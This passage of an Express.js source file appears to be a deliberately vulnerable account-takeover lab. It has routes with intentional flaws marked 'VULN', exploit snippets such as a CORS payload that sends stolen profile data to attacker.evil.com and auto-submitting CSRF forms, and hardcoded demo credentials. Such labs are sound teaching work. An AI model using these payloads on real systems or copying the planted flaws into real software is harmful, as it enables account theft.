app.post("/lab/security-questions/update", (req, res) => {
  const { username, a1, a2, a3 } = req.body
  // VULN: trusts username from body, not session
  const entry = Object.entries(users).find(([_, u]) => u.username === username)
  if (!entry) return res.redirect("/lab/security-questions?msg=User+not+found")
  const [email] = entry
  users[email].secQ1 = a1
  users[email].secQ2 = a2
  users[email].secQ3 = a3
  res.redirect(`/lab/security-questions?msg=${encodeURIComponent(`✓ Security answers for "${username}" overwritten. Now login via security questions.`)}`)
})

// LAB 3: Email Change ATO
app.get("/lab/email-change", (req, res) => {
  res.send(layout("Email Change ATO", `
    <div class="page-title">EMAIL CHANGE <span>TAKEOVER</span></div>
    <div class="vuln-tag high">HIGH — Confirmation link forwarded to victim</div>
    <div class="page-sub">Attacker initiates email change to victim's email, then sends victim the confirmation link</div>
    <div class="card">
      <div class="card-title">ATTACK FLOW</div>
      <div class="code-block">
1. Attacker logs in as attacker@corp.com<br>
2. Attacker requests email change to victim@gmail.com<br>
3. Confirmation link sent to victim@gmail.com<br>
4. Victim clicks link → attacker's account now has victim email<br>
5. Attacker resets password using victim's email → full ATO
      </div>
    </div>
    <div class="card">
      <div class="card-title">SIMULATE — REQUEST EMAIL CHANGE</div>
      ${req.query.link ? `<div class="alert alert-warn">Confirmation link (debug): <span class="mono">${decodeURIComponent(req.query.link)}</span></div>` : ''}
      ${req.session.authed ? `
      <form method="POST" action="/lab/email-change/request">
        <div class="field"><label>New Email (attacker target)</label><input type="email" name="newEmail" placeholder="victim@gmail.com"></div>
        <button class="btn btn-danger">REQUEST CHANGE</button>
      </form>` : `<div class="alert alert-info">Login first to simulate</div><a href="/login" class="btn btn-ghost btn-sm">Login</a>`}
    </div>
    <div class="card">
      <div class="card-title">ALSO: CSRF VECTOR</div>
      <div class="card-sub">No CSRF token on this endpoint — force victim to change their own email:</div>
      <div class="code-block">&lt;form action="http://localhost:3002/account/change-email" method="POST"&gt;<br>  &lt;input name="newEmail" value="attacker@evil.com"&gt;<br>&lt;/form&gt;<br>&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</div>
    </div>
  `, req.session.user))
})

app.post("/lab/email-change/request", (req, res) => {
  if (!req.session.authed) return res.redirect("/login")
  const token = Math.random().toString(36).substring(2, 12)
  EMAIL_CHANGE[token] = { oldEmail: req.session.email, newEmail: req.body.newEmail }
  const link = `http://localhost:3002/account/confirm-email/${token}`
  res.redirect(`/lab/email-change?link=${encodeURIComponent(link)}`)
})

// LAB 4: Email Verification Bypass
app.get("/lab/email-verify-bypass", (req, res) => {
  res.send(layout("Email Verify Bypass", `
    <div class="page-title">EMAIL VERIFICATION <span>BYPASS</span></div>
    <div class="vuln-tag medium">MEDIUM — Verified status transferred via email change</div>
    <div class="page-sub">Login with attacker account → change email to victim's → bypass email verification</div>
    <div class="card">
      <div class="card-title">ATTACK FLOW</div>
      <div class="code-block">
1. Attacker registers attacker@evil.com and verifies email<br>
2. Attacker changes verified email to victim@corp.com (no re-verification)<br>
3. Platform now treats victim@corp.com as verified<br>
4. Attacker has full verified access on victim's email
      </div>
    </div>
    <div class="card">
      <div class="card-title">SIMULATE</div>
      ${req.query.msg ? `<div class="alert alert-success">${decodeURIComponent(req.query.msg)}</div>` : ''}
      ${req.session.authed ? `
      <form method="POST" action="/lab/email-verify-bypass/change">
        <div class="field"><label>Change current email to victim's email</label>
          <input name="targetEmail" placeholder="victim@corp.com" value="victim@corp.com">
        </div>
        <button class="btn btn-warn">BYPASS VERIFICATION</button>
      </form>` : `<a href="/login" class="btn btn-ghost btn-sm">Login First</a>`}
    </div>
  `, req.session.user))
})

app.post("/lab/email-verify-bypass/change", (req, res) => {
  if (!req.session.authed) return res.redirect("/login")
  // VULN: no re-verification on email change
  const newEmail = req.body.targetEmail
  const old = req.session.email
  users[newEmail] = { ...users[old], verified: true } // inherits verified=true
  delete users[old]
  req.session.email = newEmail
  req.session.user = users[newEmail]
  res.redirect(`/lab/email-verify-bypass?msg=${encodeURIComponent(`✓ Email changed to ${newEmail} with verified=true — no re-verification required`)}`)
})

// LAB 5: Unicode Normalization
app.get("/lab/unicode", (req, res) => {
  res.send(layout("Unicode Normalization", `
    <div class="page-title">UNICODE <span>NORMALIZATION</span></div>
    <div class="vuln-tag medium">MEDIUM — Lookalike unicode collides post-normalization</div>
    <div class="page-sub">Platform normalizes unicode on lookup but not on registration — attacker registers lookalike email</div>
    <div class="card">
      <div class="card-title">EXAMPLE ATTACK</div>
      <div class="code-block">
Victim email:   victim@corp.com<br>
Attacker email: vićtim@corp.com  (ć = U+0107)<br><br>
Platform normalizes "vić" → "vic" on login lookup<br>
Both emails resolve to same account after normalization
      </div>
    </div>
    <div class="card">
      <div class="card-title">SIMULATE — REGISTER UNICODE LOOKALIKE</div>
      ${req.query.msg ? `<div class="alert alert-${req.query.t||'info'}">${decodeURIComponent(req.query.msg)}</div>` : ''}
      <form method="POST" action="/lab/unicode/register">
        <div class="field"><label>Unicode Email (e.g. vićtim@corp.com)</label><input name="email" placeholder="vićtim@corp.com" value="vićtim@corp.com"></div>
        <div class="field"><label>Password</label><input type="password" name="password" value="hack123"></div>
        <button class="btn btn-warn">REGISTER LOOKALIKE</button>
      </form>
    </div>
    <div class="card">
      <div class="card-title">SIMULATE — NORMALIZED LOGIN</div>
      <div class="card-sub">Login with unicode email — platform normalizes it to victim's record</div>
      <form method="POST" action="/lab/unicode/login">
        <div class="field"><label>Unicode Email</label><input name="email" placeholder="vićtim@corp.com" value="vićtim@corp.com"></div>
        <div class="field"><label>Password</label><input type="password" name="password" value="hack123"></div>
        <button class="btn btn-danger">NORMALIZED LOGIN</button>
      </form>
    </div>
  `, req.session.user))
})

app.post("/lab/unicode/register", (req, res) => {
  const { email, password } = req.body
  // VULN: does not normalize on registration, allows lookalike
  users[email] = { password, username: email.split('@')[0], role: "user", verified: false, secQ1: "x", secQ2: "x", secQ3: "x", trustedDevice: null }
  res.redirect(`/lab/unicode?msg=${encodeURIComponent(`Registered: ${email}`)}&t=success`)
})

app.post("/lab/unicode/login", (req, res) => {
  let { email, password } = req.body
  // VULN: normalizes unicode AFTER registration — collides with victim
  const normalized = email.normalize("NFKD").replace(/[\u0300-\u036f]/g, "").toLowerCase()
  // Find match by normalizing all stored emails
  const match = Object.entries(users).find(([e]) => {
    const n = e.normalize("NFKD").replace(/[\u0300-\u036f]/g, "").toLowerCase()
    return n === normalized
  })
  if (match && match[1].password === password) {
    const [e, user] = match
    req.session.email = e
    req.session.user = user
    req.session.authed = true
    res.redirect(`/lab/unicode?msg=${encodeURIComponent(`✓ Normalized login matched account: ${e}`)}&t=success`)
  } else {
    res.redirect(`/lab/unicode?msg=No+match+found&t=danger`)
  }
})

// LAB 6: OAuth Bypass / Pre-ATO
app.get("/lab/oauth", (req, res) => {
  res.send(layout("OAuth Bypass", `
    <div class="page-title">OAUTH <span>BYPASS</span> / PRE-ATO</div>
    <div class="vuln-tag medium">MEDIUM — OAuth login merges with pre-registered email</div>
    <div class="page-sub">Register victim's email before they sign up via OAuth — when they link OAuth, attacker gains access</div>
    <div class="card">
      <div class="card-title">ATTACK FLOW</div>
      <div class="code-block">
1. Attacker registers victim@corp.com with known password<br>
2. Victim later registers via Google OAuth (same email)<br>
3. Platform merges OAuth into existing account<br>
4. Attacker still has password access → full ATO
      </div>
    </div>
    <div class="card">
      <div class="card-title">SIMULATE OAUTH LOGIN</div>
      <div class="card-sub">Platform links OAuth account by email without checking if account was manually created</div>
      ${req.query.msg ? `<div class="alert alert-success">${decodeURIComponent(req.query.msg)}</div>` : ''}
      <form method="POST" action="/lab/oauth/login">
        <div class="field"><label>OAuth Email (from Google)</label><input name="email" placeholder="victim@corp.com" value="victim@corp.com"></div>
        <button class="btn btn-primary">SIMULATE OAUTH LOGIN</button>
      </form>
    </div>
  `, req.session.user))
})

app.post("/lab/oauth/login", (req, res) => {
  const email = req.body.email
  // VULN: merges OAuth with any existing account by email, no verification
  if (!users[email]) {
    users[email] = { password: null, username: email.split('@')[0], role: "user", verified: true, secQ1:"x",secQ2:"x",secQ3:"x", trustedDevice: null }
  }
  // Mark as oauth but still accessible by password if one was set pre-ATO
  req.session.email = email
  req.session.user = users[email]
  req.session.authed = true
  res.redirect(`/lab/oauth?msg=${encodeURIComponent(`OAuth login merged with existing account: ${email}. Password still works if pre-set!`)}`)
})

// LAB 7: CORS Misconfiguration
app.get("/lab/cors", (req, res) => {
  res.send(layout("CORS Steal", `
    <div class="page-title">CORS <span>MISCONFIGURATION</span></div>
    <div class="vuln-tag medium">MEDIUM — Origin reflection leaks session data</div>
    <div class="card">
      <div class="card-title">VULNERABLE ENDPOINT</div>
      <div class="card-sub">GET /api/user/profile reflects any Origin and sets Access-Control-Allow-Credentials: true</div>
      <div class="code-block">
GET /api/user/profile HTTP/1.1<br>
Origin: https://attacker.evil.com<br>
Cookie: session=victim_session<br><br>
Response:<br>
Access-Control-Allow-Origin: https://attacker.evil.com<br>
Access-Control-Allow-Credentials: true<br>
{"email":"victim@corp.com","role":"user","trustedDevice":"device-victim-007"}
      </div>
    </div>
    <div class="card">
      <div class="card-title">EXPLOIT — ATTACKER PAGE</div>
      <div class="code-block">
fetch("http://localhost:3002/api/user/profile", {credentials:"include"})<br>
  .then(r =&gt; r.json())<br>
  .then(data =&gt; fetch("https://attacker.evil.com/steal?d="+JSON.stringify(data)))
      </div>
    </div>
    <div class="card">
      <div class="card-title">TEST ENDPOINT</div>
      <a href="/api/user/profile" class="btn btn-primary btn-sm">GET /api/user/profile</a>
    </div>
  `, req.session.user))
})

// CORS-vulnerable API endpoint
app.get("/api/user/profile", (req, res) => {
  // VULN: reflects any origin
  const origin = req.headers.origin || "*"
  res.setHeader("Access-Control-Allow-Origin", origin)
  res.setHeader("Access-Control-Allow-Credentials", "true")
  if (!req.session.authed) return res.json({ error: "not authenticated" })
  const u = req.session.user
  res.json({ email: req.session.email, role: u.role, username: u.username, trustedDevice: u.trustedDevice, verified: u.verified })
})

// LAB 8: CSRF
app.get("/lab/csrf", (req, res) => {
  res.send(layout("CSRF", `
    <div class="page-title">CSRF — <span>EMAIL CHANGE</span></div>
    <div class="vuln-tag medium">MEDIUM — No CSRF token on state-changing requests</div>
    <div class="card">
      <div class="card-title">VULNERABLE ENDPOINT</div>
      <div class="card-sub">POST /account/change-email accepts cross-origin form submissions with no CSRF token validation</div>
    </div>
    <div class="card">
      <div class="card-title">EXPLOIT PAGE (attacker hosts this)</div>
      <div class="code-block">
&lt;html&gt;<br>
&lt;body onload="document.forms[0].submit()"&gt;<br>
&lt;form action="http://localhost:3002/account/change-email" method="POST"&gt;<br>
  &lt;input name="newEmail" value="attacker@evil.com"&gt;<br>
&lt;/form&gt;<br>
&lt;/body&gt;<br>
&lt;/html&gt;
      </div>
    </div>
    <div class="card">
      <div class="card-title">SIMULATE</div>
      <form method="POST" action="/account/change-email">
        <div class="field"><label>New Email (CSRF payload)</label><input type="email" name="newEmail" value="attacker@evil.com"></div>
        <button class="btn btn-danger">FIRE CSRF</button>
      </form>
    </div>
  `, req.session.user))
})

// LAB 9: Host Header Injection
app.get("/lab/host-header", (req, res) => {
  res.send(layout("Host Header Injection", `
    <div class="page-title">HOST HEADER <span>INJECTION</span></div>
    <div class="vuln-tag medium">MEDIUM — Reset link built from Host header</div>
    <div class="page-sub">The password reset email link is constructed using the Host or X-Forwarded-Host header</div>
    <div class="card">
      <div class="card-title">VULNERABLE CODE</div>
      <div class="code-block">
// Server builds reset link from request headers (VULN)<br>
const host = req.headers['x-forwarded-host'] || req.headers['host']<br>
const resetLink = \`https://\${host}/reset/\${token}\`<br>
// Email sent to victim contains attacker's domain
      </div>
    </div>
    <div class="card">
      <div class="card-title">SIMULATE POISONED RESET</div>
      ${req.query.link ? `<div class="alert alert-danger">Poisoned link: <span class="mono">${decodeURIComponent(req.query.link)}</span></div>` : ''}
      <form method="POST" action="/lab/host-header/reset">
        <div class="field"><label>Target Email</label><input name="email" value="victim@corp.com"></div>
        <div class="field"><label>X-Forwarded-Host Override</label><input name="fakeHost" value="attacker.evil.com"></div>
        <button class="btn btn-danger">POISON RESET LINK</button>
      </form>
    </div>
  `, req.session.user))
})

app.post("/lab/host-header/reset", (req, res) => {
  const { email, fakeHost } = req.body
  if (!users[email]) return res.redirect("/lab/host-header?link=user+not+found")
  const token = Math.random().toString(36).substring(2, 10)
  RESET_TOKENS[token] = email
  // VULN: uses attacker-supplied host
  const host = fakeHost || req.headers['x-forwarded-host'] || req.headers.host
  const link = `https://${host}/reset/${token}`
  res.redirect(`/lab/host-header?link=${encodeURIComponent(link)}`)
})

// LAB 10: Response Manipulation
app.get("/lab/response-manip", (req, res) => {
  res.send(layout("Response Manipulation", `
    <div class="page-title">RESPONSE <span>MANIPULATION</span></div>
    <div class="vuln-tag info">INFO — Boolean JSON response flip</div>
    <div class="card">
      <div class="card-title">HOW IT WORKS</div>
      <div class="card-sub">GET /admin returns JSON with <span class="mono c-accent">{"authorized": false}</span> for non-admins. Intercept in Burp and change to <span class="mono c-accent">{"authorized": true}</span></div>
      <div class="code-block">
# Normal response for non-admin<br>
GET /admin  →  {"authorized": false, "user": "victim"}<br><br>
# Manipulated response (via Burp proxy intercept)<br>
GET /admin  →  {"authorized": true, "user": "victim"}<br><br>
# Also try:<br>
HTTP/1.1 403 Forbidden  →  HTTP/1.1 200 OK<br>
{"success": false}      →  {"success": true}<br>
{"error": "denied"}     →  {}
      </div>
    </div>
    <div class="card">
      <div class="card-title">TEST</div>
      <a href="/admin" class="btn btn-danger btn-sm">GET /admin (non-admin)</a>
      <span class="c-muted mono" style="font-size:12px;margin-left:12px">Intercept with Burp → flip authorized</span>
    </div>
  `, req.session.user))
})

// LAB 11: Old Sessions
app.get("/lab/old-sessions", (req, res) => {
  res.send(layout("Old Sessions", `
    <div class="page-title">OLD SESSION <span>REUSE</span></div>
    <div class="vuln-tag info">INFO — Previous sessions valid after logout</div>
    <div class="card">
      <div class="card-title">VULNERABILITY</div>
      <div class="card-sub">Sessions are never server-side invalidated on logout. Only client-side cookie is cleared. Old captured cookies remain valid.</div>
      <div class="code-block">
# Saved session IDs from previous logins (still valid):<br>
${Object.entries(OLD_SESSIONS).map(([e, ids]) =>
  `${e}: [${ids.slice(-3).join(", ")}]`
).join('\n') || "Login and logout first to see old session IDs"}
      </div>
    </div>
    <div class="card">
      <div class="card-title">HOW TO EXPLOIT</div>
      <div class="code-block">
1. Capture victim's session cookie via XSS / network sniff<br>
2. Victim logs out (clears their cookie)<br>
3. Attacker replays old session cookie → still works<br>
4. Session was never invalidated server-side
      </div>
    </div>
  `, req.session.user))
})

// LAB 12: Trusted Device
app.get("/lab/trusted-device", (req, res) => {
  res.send(layout("Trusted Device Leak", `
    <div class="page-title">TRUSTED DEVICE <span>COOKIE LEAK</span></div>
    <div class="vuln-tag high">HIGH — Batch API leaks device token cross-origin</div>
    <div class="card">
      <div class="card-title">VULNERABILITY</div>
      <div class="card-sub">Trusted device tokens are exposed via a batch API that chains responses into attacker-visible sinks</div>
      <div class="code-block">
# Vulnerable batch API<br>
POST /api/batch<br>
[<br>
  {"id":"leak","url":"/api/user/profile"},<br>
  {"id":"exfil","url":"/api/post?msg={result=leak:$.trustedDevice}"}<br>
]<br><br>
# Result: trustedDevice token written to attacker-visible endpoint
      </div>
    </div>
    <div class="card">
      <div class="card-title">SIMULATE — GET TRUSTED DEVICE TOKEN</div>
      ${req.query.msg ? `<div class="alert alert-danger">${decodeURIComponent(req.query.msg)}</div>` : ''}
      <form method="POST" action="/api/batch" target="_blank">
        <input type="hidden" name="requests" value='[{"id":"leak","url":"/api/user/profile"}]'>
        <button class="btn btn-danger">FIRE BATCH REQUEST</button>
      </form>
    </div>
    <div class="card">
      <div class="card-title">SIMULATE — USE TRUSTED DEVICE TOKEN</div>
      <div class="card-sub">A stolen trusted device token relaxes recovery checks (e.g., skip 2FA, add email without password)</div>
      <form method="POST" action="/lab/trusted-device/use">
        <div class="field"><label>Stolen Device Token</label><input name="token" placeholder="device-victim-007"></div>
        <button class="btn btn-warn">LOGIN WITH DEVICE TOKEN</button>
      </form>
    </div>
  `, req.session.user))
})

app.post("/api/batch", (req, res) => {
  // VULN: returns sensitive fields in batch response, chaining possible
  if (!req.session.authed) return res.json({ error: "auth required" })
  const user = req.session.user
  // Simulate batch response leaking trustedDevice
  res.json([
    { id: "leak", status: 200, body: { email: req.session.email, role: user.role, trustedDevice: user.trustedDevice } }
  ])
})

app.post("/lab/trusted-device/use", (req, res) => {
  const { token } = req.body
  // VULN: trustedDevice token is accepted without password
  const match = Object.entries(users).find(([_, u]) => u.trustedDevice === token)
  if (!match) return res.redirect(`/lab/trusted-device?msg=${encodeURIComponent("Token not found")}`)
  const [email, user] = match
  req.session.email = email
  req.session.user = user
  req.session.authed = true
  res.redirect("/dashboard")
})

// LAB 13: Pre-ATO
app.get("/lab/pre-ato", (req, res) => {
  res.send(layout("Pre-Account Takeover", `
    <div class="page-title">PRE-ACCOUNT <span>TAKEOVER</span></div>
    <div class="vuln-tag medium">MEDIUM — Register victim email before they sign up</div>
    <div class="card">
      <div class="card-title">ATTACK FLOW</div>
      <div class="code-block">
1. Attacker registers victim@corp.com with password "hack123"<br>
2. Account sits unverified<br>
3. Victim signs up via OAuth (same email) → platform confirms account<br>
4. Attacker still has password → logs in and takes over<br><br>
OR:<br>
1. Attacker registers victim@corp.com<br>
2. Victim receives verification email (sent to their real inbox)<br>
3. Victim confirms → account now active<br>
4. Attacker logs in with their known password
      </div>
    </div>
    <div class="card">
      <div class="card-title">SIMULATE — PRE-REGISTER VICTIM</div>
      ${req.query.msg ? `<div class="alert alert-${req.query.t||'info'}">${decodeURIComponent(req.query.msg)}</div>` : ''}
      <form method="POST" action="/lab/pre-ato/register">
        <div class="field"><label>Victim Email (pre-register)</label><input name="email" value="newvictim@corp.com"></div>
        <div class="field"><label>Attacker Password (you control this)</label><input type="password" name="password" value="attacker123"></div>
        <button class="btn btn-danger">PRE-REGISTER VICTIM EMAIL</button>
      </form>
    </div>
    <div class="card">
      <div class="card-title">SIMULATE — VICTIM DOES OAUTH</div>
      <form method="POST" action="/lab/oauth/login">
        <div class="field"><label>Victim's OAuth Email</label><input name="email" value="newvictim@corp.com"></div>
        <button class="btn btn-primary">VICTIM OAUTH LOGIN (confirm account)</button>
      </form>
    </div>
    <div class="card">
      <div class="card-title">SIMULATE — ATTACKER LOGS IN WITH PRE-SET PASSWORD</div>
      <form method="POST" action="/lab/pre-ato/login">
        <div class="field"><label>Email</label><input name="email" value="newvictim@corp.com"></div>
        <div class="field"><label>Attacker Password</label><input type="password" name="password" value="attacker123"></div>
        <button class="btn btn-danger">ATTACKER LOGIN → VICTIM ACCOUNT</button>
      </form>
    </div>
  `, req.session.user))
})

app.post("/lab/pre-ato/register", (req, res) => {
  const { email, password } = req.body
  users[email] = { password, username: email.split('@')[0], role: "user", verified: false, secQ1:"x",secQ2:"x",secQ3:"x", trustedDevice: null }
  res.redirect(`/lab/pre-ato?msg=${encodeURIComponent(`Pre-registered: ${email} with attacker password`)}&t=success`)
})

app.post("/lab/pre-ato/login", (req, res) => {
  const { email, password } = req.body
  const user = users[email]
  if (user && user.password === password) {
    req.session.email = email
    req.session.user = user
    req.session.authed = true
    res.redirect("/dashboard")
  } else {
    res.redirect(`/lab/pre-ato?msg=Login+failed&t=danger`)
  }
})

// ─── START ────────────────────────────────────────────────────
app.listen(3002, () => {
  console.log("\n🔐 ATO Lab 4 running → http://localhost:3002\n")
  console.log("  Credentials:")
  console.log("  admin@corp.com  / admin123")
  console.log("  victim@corp.com / victim123")
  console.log("  user@corp.com   / user123\n")
})
